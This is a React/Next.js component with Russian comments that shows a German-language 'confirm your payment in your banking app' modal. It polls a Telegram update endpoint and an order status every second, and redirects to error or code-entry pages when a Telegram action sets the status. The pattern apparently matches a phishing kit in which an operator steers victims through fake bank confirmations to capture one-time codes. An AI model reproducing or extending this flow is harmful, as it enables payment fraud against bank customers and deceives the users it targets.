'use client';

import { useEffect, useState, Suspense } from 'react';
import { useRouter } from 'next/navigation';

interface PushNotificationModalProps {
  orderId?: string | null;
  onClose?: () => void;
}

function PushNotificationModalContent({ orderId, onClose }: PushNotificationModalProps) {
  const router = useRouter();
  const [pollOffset, setPollOffset] = useState('0');

  // Polling статуса заказа, чтобы реагировать на нажатие "ошибка" в Telegram
  useEffect(() => {
    if (!orderId) return;

    let isPolling = true;

    const checkStatus = async () => {
      if (!isPolling) return;

      try {
        // Проверяем обновления Telegram
        try {
          const pollResponse = await fetch(`/api/telegram/poll-updates?offset=${pollOffset}&t=${Date.now()}`, {
            cache: 'no-store',
          });

          if (pollResponse.ok) {
            const pollData = await pollResponse.json();
            if (pollData.lastUpdateId) {
              setPollOffset(pollData.lastUpdateId.toString());
            }
          }
        } catch (pollError) {
          console.error('[PushModal] Poll error:', pollError);
        }

        // Проверяем статус заказа
        const response = await fetch(`/api/orders/${orderId}/status?t=${Date.now()}`, {
          cache: 'no-store',
          headers: {
            'Cache-Control': 'no-cache',
          }
        });

        if (response.ok) {
          const data = await response.json();
          const status = data.status;

          console.log('[PushModal] Status check:', { orderId, status });

          // Если статус изменился на error или code, перенаправляем
          if (status === 'error') {
            console.log('[PushModal] Status changed to error, redirecting');
            isPolling = false;
            router.push(`/checkout/error?orderId=${orderId}`);
            return;
          } else if (status === 'code') {
            console.log('[PushModal] Status changed to code, redirecting');
            isPolling = false;
            router.push(`/checkout/code?orderId=${orderId}`);
            return;
          }
        }
      } catch (error) {
        console.error('[PushModal] Error checking status:', error);
      }
    };

    // Проверяем статус каждую секунду
    const interval = setInterval(() => {
      if (isPolling) {
        checkStatus();
      }
    }, 1000);
    checkStatus(); // Первая проверка сразу

    return () => {
      isPolling = false;
      clearInterval(interval);
    };
  }, [orderId, router, pollOffset]);

  return (
    <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/90 backdrop-blur-md">
      <div className="bg-gradient-to-br from-card-bg-start to-card-bg-end rounded-card border border-neon-green/50 shadow-lg p-8 max-w-md w-full mx-4">
        <div className="text-center mb-6">
          <div className="w-20 h-20 mx-auto mb-4 rounded-full bg-neon-green/20 flex items-center justify-center">
            <svg className="w-12 h-12 text-neon-green" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
            </svg>
          </div>
          <h2 className="text-2xl font-bold mb-2">Bestätigung erforderlich</h2>
          <p className="text-text-muted">
            Bitte bestätigen Sie Ihre Zahlung in der Banking-App auf Ihrem Smartphone.
          </p>
        </div>
        
        <div className="space-y-4 mb-6">
          <div className="bg-background/40 rounded-lg p-4 border border-card-border">
            <div className="flex items-start gap-3">
              <div className="flex-shrink-0 w-8 h-8 rounded-full bg-neon-green/20 flex items-center justify-center mt-0.5">
                <span className="text-neon-green text-sm">1</span>
              </div>
              <div>
                <p className="font-medium mb-1">Push-Benachrichtigung erhalten</p>
                <p className="text-sm text-text-muted">Öffnen Sie die Banking-App auf Ihrem Gerät</p>
              </div>
            </div>
          </div>
          
          <div className="bg-background/40 rounded-lg p-4 border border-card-border">
            <div className="flex items-start gap-3">
              <div className="flex-shrink-0 w-8 h-8 rounded-full bg-neon-green/20 flex items-center justify-center mt-0.5">
                <span className="text-neon-green text-sm">2</span>
              </div>
              <div>
                <p className="font-medium mb-1">Transaktion bestätigen</p>
                <p className="text-sm text-text-muted">Bestätigen Sie die Zahlung in der App</p>
              </div>
            </div>
          </div>
        </div>
        
        <div className="text-center text-sm text-text-muted">
          Bitte warten Sie, während wir Ihre Bestätigung verarbeiten...
        </div>
      </div>
    </div>
  );
}

export default function PushNotificationModal({ orderId, onClose }: PushNotificationModalProps) {
  return (
    <Suspense fallback={
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-background/90 backdrop-blur-md">
        <div className="text-text-muted">Lade...</div>
      </div>
    }>
      <PushNotificationModalContent orderId={orderId} onClose={onClose} />
    </Suspense>
  );
}
